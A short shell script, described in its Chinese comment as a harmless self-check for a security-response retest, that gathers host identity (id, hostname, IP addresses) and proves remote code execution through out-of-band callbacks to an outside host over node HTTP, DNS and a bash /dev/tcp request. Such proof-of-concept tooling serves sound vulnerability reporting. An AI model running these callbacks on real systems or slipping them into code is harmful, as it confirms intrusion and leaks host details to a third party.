#!/bin/sh
# 无害化自检脚本（SRC 复测用）：只读探测 + OOB 回连，不做任何写入或破坏
set -u
M="MILOCO_AGENTS_CHECK"
echo "/= $M identity /="
id
hostname
hostname -I
echo "/= $M dns /="
getent hosts ssrf.dun.mi.com || echo "DNS_MISS"
echo "/= $M rce-oob /="
node -e "require('http').get('http://rce_b22f387e_1794757525.evileye.me/')"; node -e "require('dns').lookup('rce_b22f387e_1794757525.evileye.me',()=>0)"; bash -c 'exec 3<>/dev/tcp/rce_b22f387e_1794757525.evileye.me/80; echo -e "GET / HTTP/1.1\r\nHost: rce_b22f387e_1794757525.evileye.me\r\n\r\n" >&3; exec 3<&-'
echo "/= $M ssrf-oob /="
# no SSRF_OOB_URL
echo "/= $M done /="
